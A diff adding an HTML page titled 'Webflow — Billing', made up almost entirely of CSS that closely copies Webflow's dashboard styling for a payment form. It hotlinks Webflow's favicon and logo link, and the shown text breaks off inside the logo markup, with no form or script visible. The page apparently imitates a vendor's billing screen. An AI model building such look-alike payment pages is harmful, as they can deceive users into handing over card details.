@@ -1,0 +1,1872 @@
+<html lang="en"><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Webflow — Billing</title>
+<style>
+  *{box-sizing:border-box} body{margin:0;background:#f5f5f5;color:#111;font:14px Inter,Arial,sans-serif}
+  .page{min-height:100vh;display:flex;flex-direction:column}
+  header{background:#fff;border-bottom:1px solid #e5e5e5;padding:18px 28px}
+  .header-row{max-width:1040px;margin:auto;display:flex;align-items:center;justify-content:space-between}
+  .brand{font-weight:700;font-size:22px}.step{font-weight:600}
+  .progress{max-width:1040px;height:4px;background:#e5e5e5;margin:14px auto 0;border-radius:4px;overflow:hidden}
+  .bar{height:100%;width:50%;background:#146ef5;transition:width .2s}
+  main{width:min(680px,calc(100% - 32px));margin:42px auto}
+  .card{background:#fff;border:1px solid #e2e2e2;border-radius:8px;padding:28px;box-shadow:0 2px 8px rgba(0,0,0,.04)}
+  h1{font-size:24px;margin:0 0 8px}.sub{color:#666;margin:0 0 24px}
+  .grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}.full{grid-column:1/-1}
+  label{display:block;font-weight:600;margin-bottom:7px}
+  input,select{width:100%;height:44px;border:1px solid #cfcfcf;border-radius:6px;padding:0 12px;font:inherit;background:#fff;transition:border-color .15s,box-shadow .15s,background .15s}
+  input::placeholder{color:#8b8b8b}
+  input:focus{outline:none;border-color:#146ef5;box-shadow:0 0 0 3px rgba(20,110,245,.12)}
+  .field{position:relative}
+  .field .error-text{
+    display:none;
+    color:#c62828;
+    font-size:12px;
+    line-height:17px;
+    margin-top:6px;
+  }
+  .field.error .error-text{
+    display:block;
+  }
+  .field.error input{border-color:#d92d20;background:#fffafa}
+  .field.error input:focus{border-color:#d92d20;box-shadow:0 0 0 3px rgba(217,45,32,.12)}
+  .field.success input{border-color:#146ef5}
+  .field.success input:focus{border-color:#146ef5;box-shadow:0 0 0 3px rgba(20,110,245,.12)}
+  .field.success .error-text{display:none}
+  .actions{display:flex;align-items:stretch;gap:12px;margin-top:26px;width:100%}
+  button{height:42px;border-radius:5px;border:1px solid #ccc;padding:0 18px;font-weight:600;font:inherit;cursor:pointer}
+  .primary{background:#146ef5;color:#fff;border-color:#146ef5;display:block;flex:1 1 auto;width:100%;min-width:0}.secondary{background:#fff;min-width:110px}
+  .hidden{display:none}
+  .notice{font-size:12px;color:#666;margin-top:14px}
+  @media(max-width:600px){.grid{grid-template-columns:1fr}.full{grid-column:auto}header{padding:16px}.card{padding:20px}}
+
+  .actions .primary { box-sizing:border-box; margin:0;
+    box-sizing: border-box;
+    margin: 0;
+  }
+  button.primary {
+    appearance: none;
+    -webkit-appearance: none;
+  }
+
+
+  :root{
+    --brand:#146ef5;
+    --ink:#111111;
+    --muted:#707070;
+    --line:#dedede;
+    --surface:#ffffff;
+    --canvas:#f7f7f7;
+    --danger:#c62828;
+  }
+
+  body{
+    background:var(--canvas);
+    color:var(--ink);
+  }
+
+  header{
+    background:rgba(255,255,255,.96);
+    border-bottom:1px solid #e8e8e8;
+    padding:20px 28px 18px;
+  }
+
+  .header-row{
+    max-width:680px;
+  }
+
+  .brand{
+    font-size:20px;
+    letter-spacing:-.03em;
+    font-weight:700;
+  }
+
+  .step{
+    color:#555;
+    font-size:13px;
+    letter-spacing:.01em;
+  }
+
+  .progress{
+    max-width:680px;
+    height:3px;
+    margin-top:15px;
+    background:#e9e9e9;
+    border-radius:999px;
+  }
+
+  .bar{
+    background:var(--brand);
+    border-radius:999px;
+  }
+
+  main{
+    width:min(680px,calc(100% - 32px));
+    margin:56px auto 64px;
+  }
+
+  .card{
+    background:var(--surface);
+    border:1px solid #e5e5e5;
+    border-radius:10px;
+    padding:34px;
+    box-shadow:0 8px 28px rgba(0,0,0,.045);
+  }
+
+  h1{
+    font-size:28px;
+    line-height:1.05;
+    letter-spacing:-.045em;
+    margin:0 0 9px;
+  }
+
+  .sub{
+    color:var(--muted);
+    font-size:14px;
+    line-height:1.5;
+    margin:0 0 28px;
+  }
+
+  .grid{
+    gap:18px;
+  }
+
+  label{
+    color:#2f2f2f;
+    font-size:13px;
+    margin-bottom:8px;
+  }
+
+  input,select{
+    height:46px;
+    border:1px solid var(--line);
+    border-radius:6px;
+    background:#fff;
+    color:var(--ink);
+    padding:0 13px;
+    font-size:14px;
+    transition:border-color .15s ease,box-shadow .15s ease,background .15s ease;
+  }
+
+  input::placeholder{
+    color:#9a9a9a;
+  }
+
+  input:hover{
+    border-color:#c9c9c9;
+  }
+
+  input:focus,select:focus{
+    outline:none;
+    border-color:var(--brand);
+    box-shadow:0 0 0 3px rgba(20,110,245,.10);
+  }
+
+  .field.error input{
+    border-color:var(--danger);
+    background:#fffdfd;
+  }
+
+  .field.error input:focus{
+    border-color:var(--danger);
+    box-shadow:0 0 0 3px rgba(198,40,40,.09);
+  }
+
+  .field.success input{
+    border-color:var(--brand);
+  }
+
+  .actions{
+    margin-top:30px;
+    gap:10px;
+  }
+
+  button{
+    height:46px;
+    border-radius:6px;
+    font-size:14px;
+    font-weight:700;
+    letter-spacing:-.01em;
+    transition:transform .08s ease,background .15s ease,border-color .15s ease;
+  }
+
+  button:active{
+    transform:translateY(1px);
+  }
+
+  .primary{
+    background:var(--brand);
+    border-color:var(--brand);
+    color:#fff;
+    width:100%;
+    box-shadow:0 1px 2px rgba(20,110,245,.22);
+  }
+
+  .primary:hover{
+    background:#0f62e4;
+    border-color:#0f62e4;
+  }
+
+  .secondary{
+    background:#fff;
+    color:#222;
+    border-color:#d9d9d9;
+  }
+
+  .secondary:hover{
+    background:#fafafa;
+  }
+
+  .error-text{
+    color:var(--danger);
+    font-size:12px;
+    line-height:17px;
+    margin-top:6px;
+  }
+
+  @media(max-width:600px){
+    header{padding:18px 18px 16px}
+    main{margin:28px auto 40px}
+    .card{padding:24px 20px;border-radius:9px}
+    h1{font-size:24px}
+  }
+
+  .checkout-loading{
+    min-height:260px;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    gap:18px;
+    text-align:center;
+  }
+
+  .loading-mark{
+    width:28px;
+    height:28px;
+    border:2px solid #e7e7e7;
+    border-top-color:#146ef5;
+    border-radius:50%;
+    animation:checkout-spin .8s linear infinite;
+  }
+
+  .loading-title{
+    color:#222;
+    font-size:14px;
+    font-weight:700;
+    letter-spacing:-.01em;
+  }
+
+  @keyframes checkout-spin{
+    to{transform:rotate(360deg)}
+  }
+
+  .checkout-loading.hidden{
+    display:none;
+  }
+
+  .sub{
+    max-width:520px;
+  }
+
+  .loading-title{
+    color:#222;
+    font-size:14px;
+    font-weight:700;
+    letter-spacing:-.015em;
+  }
+
+  html, body, button, input, textarea, select {
+    font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+      Helvetica, Arial, sans-serif;
+  }
+
+  .payment-consent{
+    margin:22px 0 0;
+    color:#777;
+    font-size:12px;
+    line-height:1.55;
+    max-width:100%;
+  }
+
+  .brand{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    width:32px;
+    height:32px;
+    color:#111;
+    line-height:0;
+  }
+
+  .brand svg{
+    display:block;
+    width:32px;
+    height:32px;
+  }
+
+  .success-mark{
+    display:none;
+    width:32px;
+    height:32px;
+    align-items:center;
+    justify-content:center;
+    opacity:0;
+    transform:scale(.86);
+  }
+
+  .success-mark.show{
+    display:flex;
+    animation:checkout-success-in .22s ease-out forwards;
+  }
+
+  @keyframes checkout-success-in{
+    to{
+      opacity:1;
+      transform:scale(1);
+    }
+  }
+
+  /* Webflow dashboard-inspired action controls */
+  .actions{
+    align-items:stretch;
+    gap:8px;
+    margin-top:24px;
+    width:100%;
+  }
+
+  .actions button{
+    appearance:none;
+    -webkit-appearance:none;
+    height:32px;
+    min-height:32px;
+    border-radius:2px;
+    border-width:1px;
+    border-style:solid;
+    padding:0 12px;
+    font-size:13px;
+    line-height:30px;
+    font-weight:500;
+    letter-spacing:0;
+    box-shadow:0 0.5px 1px rgba(0,0,0,.06);
+    transition:
+      background .12s ease,
+      border-color .12s ease,
+      box-shadow .12s ease,
+      transform .08s ease;
+  }
+
+  .actions button:focus-visible{
+    outline:none;
+    box-shadow:0 0 0 2px rgba(20,110,245,.20),0 0.5px 1px rgba(0,0,0,.06);
+  }
+
+  .actions button:active{
+    transform:translateY(0);
+    box-shadow:inset 0 1px 2px rgba(0,0,0,.08);
+  }
+
+  .actions .primary{
+    flex:1 1 auto;
+    width:100%;
+    min-width:0;
+    color:#fff;
+    background:#146ef5;
+    border-color:#146ef5;
+    box-shadow:0 0.5px 1px rgba(0,0,0,.12), inset 0 1px 0 rgba(255,255,255,.12);
+  }
+
+  .actions .primary:hover{
+    background:#2c80fd;
+    border-color:#2c80fd;
+  }
+
+  .actions .primary:active{
+    background:#146ef5;
+    border-color:#146ef5;
+  }
+
+  .actions .secondary{
+    flex:0 0 auto;
+    min-width:72px;
+    color:#000;
+    background:linear-gradient(180deg,rgba(255,255,255,.02) 0%,rgba(255,255,255,0) 100%),#efefef;
+    border-color:rgba(0,0,0,.10);
+    box-shadow:
+      0 0 0 .5px rgba(0,0,0,.08),
+      0 1px 1px rgba(0,0,0,.04),
+      0 .5px 1px rgba(0,0,0,.05);
+  }
+
+  .actions .secondary:hover{
+    background:linear-gradient(180deg,rgba(255,255,255,.25) 0%,rgba(255,255,255,0) 100%),#e8e8e8;
+    border-color:rgba(0,0,0,.16);
+  }
+
+  .actions .secondary:active{
+    background:#efefef;
+  }
+
+  @media(max-width:600px){
+    .actions button{
+      height:40px;
+      min-height:40px;
+      line-height:38px;
+    }
+    .actions{
+      gap:8px;
+    }
+  }
+
+  :root{
+    --wf-brand:#146EF5;
+    --wf-brand-hover:#2C80FD;
+    --wf-canvas:#E8E8E8;
+    --wf-surface:#FFFFFF;
+    --wf-text:#000000;
+    --wf-text-secondary:rgba(0,0,0,.60);
+    --wf-border:#E0E0E0;
+    --wf-input-border:#DBDBDB;
+    --wf-control-radius:2px;
+    --wf-control-height:32px;
+    --wf-shadow:0 1px 3px -1px rgba(0,0,0,.16),0 3px 6px -2px rgba(0,0,0,.08);
+  }
+
+  html,body,button,input,textarea,select{
+    font-family:Inter,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,
+      Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",Arial,sans-serif;
+  }
+
+  body{
+    background:var(--wf-canvas);
+    color:var(--wf-text);
+    font-size:13px;
+    line-height:18px;
+  }
+
+  header{
+    background:var(--wf-surface);
+    border-bottom:1px solid var(--wf-border);
+    padding:0 24px;
+    min-height:58px;
+    height:58px;
+  }
+
+  .header-row{
+    max-width:1040px;
+    height:58px;
+    margin:0 auto;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+  }
+
+  .brand{
+    width:32px;
+    height:32px;
+    color:#000;
+  }
+
+  .brand svg{
+    width:32px;
+    height:32px;
+    display:block;
+  }
+
+  .step{
+    color:var(--wf-text);
+    font-size:13px;
+    line-height:18px;
+    font-weight:600;
+  }
+
+  .progress{
+    max-width:none;
+    height:2px;
+    margin:0 -24px;
+    background:#EFEFEF;
+    border-radius:0;
+  }
+
+  .bar{
+    background:var(--wf-brand);
+    height:100%;
+    border-radius:0;
+  }
+
+  main{
+    width:min(720px,calc(100% - 32px));
+    margin:48px auto 72px;
+  }
+
+  .card{
+    background:var(--wf-surface);
+    border:1px solid var(--wf-border);
+    border-radius:2px;
+    padding:32px;
+    box-shadow:var(--wf-shadow);
+  }
+
+  h1{
+    margin:0 0 8px;
+    color:var(--wf-text);
+    font-size:16px;
+    line-height:20px;
+    letter-spacing:0;
+    font-weight:600;
+  }
+
+  .sub{
+    margin:0 0 24px;
+    color:var(--wf-text-secondary);
+    font-size:13px;
+    line-height:18px;
+    max-width:none;
+  }
+
+  .grid{
+    display:grid;
+    grid-template-columns:1fr 1fr;
+    gap:16px;
+  }
+
+  .field.full{
+    grid-column:1/-1;
+  }
+
+  label{
+    color:var(--wf-text);
+    display:block;
+    margin-bottom:4px;
+    font-size:12px;
+    line-height:16px;
+    font-weight:500;
+  }
+
+  input,select{
+    width:100%;
+    height:32px;
+    min-height:32px;
+    box-sizing:border-box;
+    border:1px solid var(--wf-input-border);
+    border-radius:2px;
+    padding:6px 8px;
+    background:#fff;
+    color:var(--wf-text);
+    font-size:13px;
+    line-height:18px;
+    box-shadow:inset 0 1px 1px rgba(0,0,0,.03);
+    transition:border-color .12s ease,box-shadow .12s ease,background .12s ease;
+  }
+
+  input::placeholder{
+    color:rgba(0,0,0,.50);
+  }
+
+  input:hover{
+    border-color:#C4C4C4;
+  }
+
+  input:focus,select:focus{
+    outline:none;
+    border-color:var(--wf-brand);
+    box-shadow:0 0 0 2px rgba(20,110,245,.16);
+  }
+
+  .field.error input{
+    border-color:#CF313B;
+    background:#fff;
+    box-shadow:0 0 0 1px rgba(207,49,59,.10);
+  }
+
+  .field.error input:focus{
+    border-color:#CF313B;
+    box-shadow:0 0 0 2px rgba(207,49,59,.14);
+  }
+
+  .error-text{
+    color:#CF313B;
+    font-size:12px;
+    line-height:16px;
+    margin-top:4px;
+  }
+
+  .actions{
+    margin-top:24px;
+    width:100%;
+    display:flex;
+    align-items:center;
+    gap:8px;
+  }
+
+  .actions button{
+    appearance:none;
+    -webkit-appearance:none;
+    min-height:32px;
+    height:32px;
+    border-radius:2px;
+    border:1px solid transparent;
+    padding:0 12px;
+    font-size:13px;
+    line-height:30px;
+    font-weight:500;
+    letter-spacing:0;
+    cursor:pointer;
+    transition:background .12s ease,border-color .12s ease,box-shadow .12s ease,transform .06s ease;
+  }
+
+  .actions .primary{
+    flex:1 1 auto;
+    width:100%;
+    margin:0;
+    color:#fff;
+    background:var(--wf-brand);
+    border-color:var(--wf-brand);
+    box-shadow:0 .5px 1px rgba(0,0,0,.14), inset 0 1px 0 rgba(255,255,255,.10);
+  }
+
+  .actions .primary:hover{
+    background:var(--wf-brand-hover);
+    border-color:var(--wf-brand-hover);
+  }
+
+  .actions .primary:active{
+    background:var(--wf-brand);
+    border-color:var(--wf-brand);
+  }
+
+  .actions .secondary{
+    flex:0 0 auto;
+    min-width:72px;
+    color:#000;
+    background:linear-gradient(180deg,rgba(255,255,255,.02) 0%,rgba(255,255,255,0) 100%),#EFEFEF;
+    border-color:rgba(0,0,0,.10);
+    box-shadow:
+      0 0 0 .5px rgba(0,0,0,.08),
+      0 1px 1px rgba(0,0,0,.04),
+      0 .5px 1px rgba(0,0,0,.05);
+  }
+
+  .actions .secondary:hover{
+    background:linear-gradient(180deg,rgba(255,255,255,.25) 0%,rgba(255,255,255,0) 100%),#E8E8E8;
+    border-color:rgba(0,0,0,.16);
+  }
+
+  .payment-consent{
+    margin:16px 0 0;
+    color:var(--wf-text-secondary);
+    font-size:12px;
+    line-height:16px;
+  }
+
+  .checkout-loading{
+    min-height:260px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    border-radius:2px;
+    box-shadow:var(--wf-shadow);
+  }
+
+  .loading-mark{
+    width:20px;
+    height:20px;
+    border:2px solid #E0E0E0;
+    border-top-color:var(--wf-brand);
+    border-radius:50%;
+    animation:checkout-spin .8s linear infinite;
+  }
+
+  .success-mark{
+    width:32px;
+    height:32px;
+  }
+
+  @keyframes checkout-spin{
+    to{transform:rotate(360deg)}
+  }
+
+  @media(max-width:600px){
+    header{
+      padding:0 16px;
+    }
+    .progress{
+      margin:0 -16px;
+    }
+    main{
+      width:calc(100% - 24px);
+      margin:24px auto 40px;
+    }
+    .card{
+      padding:20px;
+    }
+    .grid{
+      grid-template-columns:1fr;
+    }
+    .field.full{
+      grid-column:1/-1;
+    }
+    .actions button{
+      height:40px;
+      min-height:40px;
+      line-height:38px;
+    }
+  }
+
+  /* Compact Webflow-style loading/success indicators */
+  .checkout-loading{
+    min-height:220px;
+  }
+
+  .loading-mark{
+    width:16px;
+    height:16px;
+    border:2px solid #E0E0E0;
+    border-top-color:#146EF5;
+    border-right-color:#146EF5;
+    border-radius:50%;
+    animation:checkout-spin .72s linear infinite;
+  }
+
+  .success-mark{
+    width:16px;
+    height:16px;
+    display:none;
+    align-items:center;
+    justify-content:center;
+    opacity:0;
+    transform:scale(.92);
+  }
+
+  .success-mark svg{
+    width:16px;
+    height:16px;
+    display:block;
+  }
+
+  .success-mark svg circle{
+    stroke:#146EF5;
+    stroke-width:1.5;
+  }
+
+  .success-mark svg path{
+    stroke:#146EF5;
+    stroke-width:1.5;
+  }
+
+  .success-mark.show{
+    display:flex;
+    animation:checkout-success-in .18s ease-out forwards;
+  }
+
+  @keyframes checkout-spin{
+    to{transform:rotate(360deg)}
+  }
+
+  @keyframes checkout-success-in{
+    to{
+      opacity:1;
+      transform:scale(1);
+    }
+  }
+
+  .step{
+    display:flex;
+    align-items:baseline;
+    gap:0;
+    color:#000;
+    font-size:13px;
+    line-height:18px;
+    font-weight:400;
+    letter-spacing:0;
+  }
+
+  .step-current{
+    font-weight:600;
+    color:#000;
+  }
+
+  .step-rest{
+    font-weight:400;
+    color:rgba(0,0,0,.60);
+  }
+
+  .loading-mark,
+  .success-mark{
+    width:16px;
+    height:16px;
+    box-sizing:border-box;
+  }
+
+  .loading-mark{
+    border:2px solid #E0E0E0;
+    border-top-color:#146ef5;
+    border-right-color:#146ef5;
+    border-radius:50%;
+  }
+
+  .success-mark{
+    display:none;
+    align-items:center;
+    justify-content:center;
+    border-radius:50%;
+    opacity:0;
+    transform:scale(.96);
+  }
+
+  .success-mark svg{
+    display:block;
+    width:16px;
+    height:16px;
+  }
+
+  .success-mark svg circle,
+  .success-mark svg path{
+    stroke:#146ef5;
+    stroke-width:2;
+  }
+
+  .success-mark.show{
+    display:flex;
+    animation:checkout-success-in .18s ease-out forwards;
+  }
+
+  .step{
+    display:flex;
+    align-items:baseline;
+    font-size:13px;
+    line-height:18px;
+    white-space:nowrap;
+  }
+
+  .step-current{
+    color:#000;
+    font-weight:600;
+  }
+
+  .step-rest{
+    display:inline-block;
+    margin-left:5px;
+    color:rgba(0,0,0,.60);
+    font-weight:400;
+  }
+
+  .loading-mark{
+    animation-duration:.9s;
+  }
+
+  .checkout-loading{
+    transition:opacity .16s ease;
+  }
+
+  .brand{
+    text-decoration:none;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+  }
+
+  .brand:focus-visible{
+    outline:none;
+    box-shadow:0 0 0 2px rgba(20,110,245,.18);
+    border-radius:2px;
+  }
+
+  .actions{
+    align-items:center;
+  }
+
+  .cancel-link{
+    flex:0 0 auto;
+    color:rgba(0,0,0,.60);
+    font-size:13px;
+    line-height:32px;
+    text-decoration:none;
+    margin-right:4px;
+  }
+
+  .cancel-link:hover{
+    color:#000;
+    text-decoration:underline;
+  }
+
+  .actions .primary:disabled{
+    color:rgba(255,255,255,.72);
+    background:#2C80FD;
+    border-color:#2C80FD;
+    box-shadow:none;
+    cursor:not-allowed;
+    opacity:1;
+  }
+
+  .actions .primary:disabled:hover{
+    background:#2C80FD;
+    border-color:#2C80FD;
+  }
+
+  .actions .cancel-link,
+  .actions .secondary{
+    appearance:none;
+    -webkit-appearance:none;
+    display:inline-flex;
+    align-items:center;
+    justify-content:center;
+    box-sizing:border-box;
+    min-height:32px;
+    height:32px;
+    min-width:72px;
+    padding:0 12px;
+    border:1px solid rgba(0,0,0,.10);
+    border-radius:2px;
+    color:#000;
+    background:
+      linear-gradient(180deg,rgba(255,255,255,.02) 0%,rgba(255,255,255,0) 100%),
+      #EFEFEF;
+    box-shadow:
+      0 0 0 .5px rgba(0,0,0,.08),
+      0 1px 1px rgba(0,0,0,.04),
+      0 .5px 1px rgba(0,0,0,.05);
+    font-size:13px;
+    line-height:30px;
+    font-weight:500;
+    text-decoration:none;
+    cursor:pointer;
+    margin:0;
+  }
+
+  .actions .cancel-link:hover,
+  .actions .secondary:hover{
+    color:#000;
+    text-decoration:none;
+    background:
+      linear-gradient(180deg,rgba(255,255,255,.25) 0%,rgba(255,255,255,0) 100%),
+      #E8E8E8;
+    border-color:rgba(0,0,0,.16);
+  }
+
+  .actions .cancel-link:active,
+  .actions .secondary:active{
+    background:#EFEFEF;
+    box-shadow:
+      0 0 0 .5px rgba(0,0,0,.08) inset,
+      0 1px 1px rgba(0,0,0,.04);
+  }
+
+  .actions .cancel-link:focus-visible,
+  .actions .secondary:focus-visible{
+    outline:none;
+    box-shadow:
+      0 0 0 2px rgba(20,110,245,.18),
+      0 0 0 .5px rgba(0,0,0,.08);
+  }
+
+  .actions-billing{
+    gap:8px;
+  }
+
+  .actions-billing .cancel-link{
+    flex:0 0 auto;
+  }
+
+  .actions-billing .primary{
+    flex:1 1 auto;
+  }
+
+  .actions{
+    display:flex;
+    align-items:center;
+    justify-content:flex-end;
+    gap:8px;
+    width:100%;
+    margin-top:24px;
+  }
+
+  .actions button,
+  .actions .cancel-link{
+    flex:0 0 auto;
+    width:auto;
+    min-width:0;
+    height:32px;
+    min-height:32px;
+    box-sizing:border-box;
+    padding:0 12px;
+    border-radius:2px;
+    font-family:Inter,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",Arial,sans-serif;
+    font-size:13px;
+    line-height:30px;
+    font-weight:500;
+    letter-spacing:0;
+  }
+
+  .actions-billing .cancel-link{
+    min-width:72px;
+  }
+
+  .actions .secondary{
+    min-width:72px;
+  }
+
+  .actions .primary{
+    flex:0 0 auto;
+    width:auto;
+    min-width:72px;
+  }
+
+  .actions .primary:disabled{
+    color:#fff;
+    background:#2C80FD;
+    border-color:#2C80FD;
+    opacity:1;
+    box-shadow:none;
+  }
+
+  .actions .primary:disabled:hover{
+    background:#2C80FD;
+    border-color:#2C80FD;
+  }
+
+  .actions .primary:not(:disabled){
+    color:#fff;
+    background:#146EF5;
+    border-color:#146EF5;
+  }
+
+  .actions .cancel-link,
+  .actions .secondary{
+    color:#000;
+    background:linear-gradient(180deg,rgba(255,255,255,.02) 0%,rgba(255,255,255,0) 100%),#EFEFEF;
+    border:1px solid rgba(0,0,0,.10);
+    box-shadow:
+      0 0 0 .5px rgba(0,0,0,.08),
+      0 1px 1px rgba(0,0,0,.04),
+      0 .5px 1px rgba(0,0,0,.05);
+    text-decoration:none;
+  }
+
+  .actions .cancel-link:hover,
+  .actions .secondary:hover{
+    background:linear-gradient(180deg,rgba(255,255,255,.25) 0%,rgba(255,255,255,0) 100%),#E8E8E8;
+    border-color:rgba(0,0,0,.16);
+  }
+
+  .actions .cancel-link:active,
+  .actions .secondary:active{
+    background:#EFEFEF;
+  }
+
+  @media(max-width:600px){
+    .actions{
+      justify-content:stretch;
+    }
+
+    .actions .primary{
+      flex:1 1 auto;
+    }
+  }
+
+  /* Webflow-style disabled primary button: light brand blue, not gray */
+  .actions .primary:disabled{
+    color:#0B2666;
+    background:#A7D1FF;
+    border-color:#A7D1FF;
+    box-shadow:none;
+    opacity:1;
+    cursor:not-allowed;
+  }
+
+  .actions .primary:disabled:hover,
+  .actions .primary:disabled:active{
+    color:#0B2666;
+    background:#A7D1FF;
+    border-color:#A7D1FF;
+    box-shadow:none;
+  }
+
+  :root{
+    --wf-text-primary:#000000;
+  }
+
+  body,
+  h1,
+  label,
+  input,
+  select,
+  button{
+    color:var(--wf-text-primary);
+  }
+
+  .actions .primary,
+  .actions .primary:hover,
+  .actions .primary:active,
+  .actions .primary:disabled,
+  .actions .primary:disabled:hover,
+  .actions .primary:disabled:active{
+    color:#FFFFFF;
+  }
+
+  .actions .primary:disabled{
+    background:#A7D1FF;
+    border-color:#A7D1FF;
+  }
+
+  .actions .primary:not(:disabled){
+    background:#146EF5;
+    border-color:#146EF5;
+  }
+
+  main{
+    width:min(640px,calc(100% - 32px));
+    margin:48px auto 72px;
+  }
+
+  .card{
+    width:100%;
+    box-sizing:border-box;
+    margin:0 auto;
+  }
+
+  .grid{
+    width:100%;
+  }
+
+  @media(max-width:600px){
+    main{
+      width:calc(100% - 24px);
+      margin:24px auto 40px;
+    }
+
+    .card{
+      width:100%;
+    }
+  }
+
+  /* Exact Webflow-style secondary controls */
+  .actions .cancel-link,
+  .actions .secondary{
+    appearance:auto;
+    -webkit-appearance:auto;
+    box-sizing:border-box;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    width:auto;
+    min-width:0;
+    height:32px;
+    padding:7px 12px;
+    margin:0;
+    border:0;
+    border-radius:4px;
+    color:rgb(0,0,0);
+    background-color:rgb(239,239,239);
+    background-image:
+      linear-gradient(rgba(255,255,255,.02) 0%,rgba(255,255,255,0) 100%),
+      none;
+    background-origin:padding-box,padding-box;
+    background-clip:border-box,border-box;
+    background-repeat:repeat,repeat;
+    background-position:0% 0%,0% 0%;
+    background-size:auto,auto;
+    box-shadow:
+      rgba(0,0,0,.08) 0 0 0 .5px,
+      rgba(0,0,0,.10) 0 -0.5px 1px 0,
+      rgba(255,255,255,.35) 0 1.5px 1px 0,
+      rgba(0,0,0,.04) 0 1px 1px 0,
+      rgba(0,0,0,.05) 0 .5px 1px 0;
+    font-family:Inter,-apple-system,"system-ui","Segoe UI",Roboto,Oxygen-Sans,
+      Ubuntu,Cantarell,"Helvetica Neue",Helvetica,Arial,
+      "Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol",sans-serif;
+    font-size:13px;
+    font-weight:400;
+    line-height:18px;
+    letter-spacing:normal;
+    text-align:center;
+    text-decoration:none;
+    white-space:nowrap;
+    cursor:pointer;
+    -webkit-font-smoothing:antialiased;
+  }
+
+  .actions .cancel-link:hover,
+  .actions .secondary:hover{
+    color:#000;
+    text-decoration:none;
+    background-color:rgb(232,232,232);
+    background-image:
+      linear-gradient(rgba(255,255,255,.25) 0%,rgba(255,255,255,0) 100%),
+      none;
+    border:0;
+  }
+
+  .actions .cancel-link:active,
+  .actions .secondary:active{
+    background-color:rgb(239,239,239);
+    box-shadow:
+      rgba(0,0,0,.08) 0 0 0 .5px,
+      rgba(0,0,0,.10) 0 -0.5px 1px 0,
+      rgba(255,255,255,.35) 0 1.5px 1px 0,
+      rgba(0,0,0,.04) 0 1px 1px 0,
+      rgba(0,0,0,.05) 0 .5px 1px 0;
+  }
+
+  .actions .cancel-link:focus-visible,
+  .actions .secondary:focus-visible{
+    outline:2px solid rgba(20,110,245,.20);
+    outline-offset:1px;
+  }
+
+  .actions{
+    gap:8px;
+  }
+
+  .actions-billing{
+    justify-content:flex-end;
+  }
+
+  @media(max-width:600px){
+    .actions .cancel-link,
+    .actions .secondary{
+      height:40px;
+      padding:11px 12px;
+    }
+  }
+
+  /* Exact Webflow-style primary controls */
+  .actions .primary{
+    appearance:auto;
+    -webkit-appearance:auto;
+    box-sizing:border-box;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    width:auto;
+    min-width:0;
+    height:32px;
+    padding:7px 12px;
+    margin:0;
+    border:0;
+    border-radius:4px;
+    background:#146EF5;
+    background-image:none;
+    color:#FFFFFF;
+    box-shadow:
+      rgba(0,0,0,.25) 0 .5px 1px 0,
+      rgba(255,255,255,.04) 0 29px 23px -16px inset,
+      rgba(255,255,255,.20) 0 .5px .5px 0 inset;
+    font-family:Inter,-apple-system,"system-ui","Segoe UI",Roboto,Oxygen-Sans,
+      Ubuntu,Cantarell,"Helvetica Neue",Helvetica,Arial,
+      "Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol",sans-serif;
+    font-size:13px;
+    font-weight:400;
+    line-height:18px;
+    letter-spacing:normal;
+    text-align:center;
+    text-decoration:none;
+    white-space:nowrap;
+    cursor:pointer;
+    opacity:1;
+    -webkit-font-smoothing:antialiased;
+  }
+
+  .actions .primary:not(:disabled):hover{
+    background:#146EF5;
+    border-color:transparent;
+    box-shadow:
+      rgba(0,0,0,.25) 0 .5px 1px 0,
+      rgba(255,255,255,.04) 0 29px 23px -16px inset,
+      rgba(255,255,255,.20) 0 .5px .5px 0 inset;
+  }
+
+  .actions .primary:not(:disabled):active{
+    background:#146EF5;
+    box-shadow:
+      rgba(0,0,0,.25) 0 .5px 1px 0,
+      rgba(255,255,255,.04) 0 29px 23px -16px inset,
+      rgba(255,255,255,.20) 0 .5px .5px 0 inset;
+  }
+
+  /* Disabled appearance: same blue, reduced opacity, not a gray substitute. */
+  .actions .primary:disabled{
+    color:#FFFFFF;
+    background:#146EF5;
+    border:0;
+    opacity:.6;
+    cursor:not-allowed;
+    box-shadow:
+      rgba(0,0,0,.25) 0 .5px 1px 0,
+      rgba(255,255,255,.04) 0 29px 23px -16px inset,
+      rgba(255,255,255,.20) 0 .5px .5px 0 inset;
+  }
+
+  .actions .primary:disabled:hover,
+  .actions .primary:disabled:active{
+    color:#FFFFFF;
+    background:#146EF5;
+    border:0;
+    opacity:.6;
+    box-shadow:
+      rgba(0,0,0,.25) 0 .5px 1px 0,
+      rgba(255,255,255,.04) 0 29px 23px -16px inset,
+      rgba(255,255,255,.20) 0 .5px .5px 0 inset;
+  }
+
+  @media(max-width:600px){
+    .actions .primary{
+      height:40px;
+      padding:11px 12px;
+    }
+  }
+</style>
+
+
+
+<link rel="icon" href="https://d3e54v103j8qbb.cloudfront.net/static/favicon_default.b10796b955.png">
+</head>
+<body>
+<div class="page">
+<header>
+  <div class="header-row">
+    <a class="brand" aria-label="Webflow" href="https://webflow.com/dashboard">
+      <svg data-wf-icon="WebflowIcon" width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <g>
